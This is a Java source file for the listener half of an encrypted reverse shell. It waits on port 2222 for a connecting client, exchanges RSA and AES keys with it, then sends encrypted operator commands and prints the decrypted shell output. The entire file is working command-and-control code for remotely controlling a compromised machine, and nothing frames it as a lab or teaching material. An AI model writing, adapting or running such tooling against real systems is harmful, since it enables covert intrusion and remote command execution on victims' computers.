package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.net.*;
import java.security.*;
import java.util.Base64;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class ReverseShellServer {

    private static final int SERVER_PORT = 2222;
    private ServerSocket serverSocket;
    private Socket clientSocket;
    private BufferedReader in;
    private PrintWriter out;
    private BufferedReader userInput;
    private KeyPair keyPair;

    public static void main(String[] args) throws Exception {
        ReverseShellServer server = new ReverseShellServer();
        server.start();
    }

    public void start() throws Exception {
        keyPair = CryptoUtils.generateRSAKeyPair();
        try {
            setupServer();
            waitForConnection();
            setupStreams();

            out.println(Base64.getEncoder().encodeToString(keyPair.getPublic().getEncoded()));
            receiveAESKey();

            Thread outputReceiver = new Thread(this::receiveResponse);
            outputReceiver.start();
            handleShell();

        } catch (IOException e) {
            System.err.println("[ERROR] Server error: " + e.getMessage());
        } finally {
            cleanup();
        }
    }

    private void setupServer() throws IOException {
        serverSocket = new ServerSocket(SERVER_PORT);
        System.out.println("[*] Server is running on port " + SERVER_PORT);
    }

    private void waitForConnection() throws IOException {
        System.out.println("[*] Waiting for incoming connection...");
        clientSocket = serverSocket.accept();
        System.out.println("[+] Connection established with " + clientSocket.getInetAddress());
    }

    private void setupStreams() throws IOException {
        in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        out = new PrintWriter(clientSocket.getOutputStream(), true);
        userInput = new BufferedReader(new InputStreamReader(System.in));
    }

    private void handleShell() throws IOException, Exception {
        String command;
        System.out.print("\nCommand> ");
        while (true) {
            command = userInput.readLine();
            if ("exit".equalsIgnoreCase(command)) {
                sendCommand("exit");
                break;
            }
            sendCommand(command);
        }
    }

    private void sendCommand(String command) throws Exception {
        System.out.println("Raw Command before Encryption: " + command); // Debug log
        String encryptedCommand = CryptoUtils.encryptAES(command, Constants.AES_SECRET_KEY, Constants.IV);
        System.out.println("Encrypted Command (Base64): " + encryptedCommand); // Debug log
        out.println(encryptedCommand);
    }

    private void receiveResponse() {
        try {
            String encryptedResponse;
            while ((encryptedResponse = in.readLine()) != null) {
                System.out.println("Encrypted Response (Base64) before Decryption: " + encryptedResponse); // Debug log
                String response = CryptoUtils.decryptAES(encryptedResponse, Constants.AES_SECRET_KEY, Constants.IV);
                System.out.println("\nShell> " + response);
                System.out.print("\nCommand> ");
            }
        } catch (Exception e) {
            System.err.println("Error receiving response: " + e.getMessage());
        }
    }

    private void receiveAESKey() throws Exception {
        String encryptedAESKey = in.readLine();
        byte[] decodedAESKey = Base64.getDecoder().decode(encryptedAESKey);
        Constants.AES_SECRET_KEY = CryptoUtils.decryptRSAToAESKey(decodedAESKey, keyPair.getPrivate());
        String ivBase64 = in.readLine(); // Receive IV from client
        Constants.IV = CryptoUtils.base64ToIv(ivBase64);
        System.out.println("AES Key (Base64): " + CryptoUtils.secretKeyToBase64(Constants.AES_SECRET_KEY)); // Debug log
        System.out.println("IV (Base64): " + CryptoUtils.ivToBase64(Constants.IV)); // Debug log
        System.out.println("[*] AES key and IV received and decrypted successfully.");
    }

    private void cleanup() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (userInput != null) {
                userInput.close();
            }
            if (clientSocket != null) {
                clientSocket.close();
            }
            if (serverSocket != null) {
                serverSocket.close();
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error closing resources: " + e.getMessage());
        }
    }
}
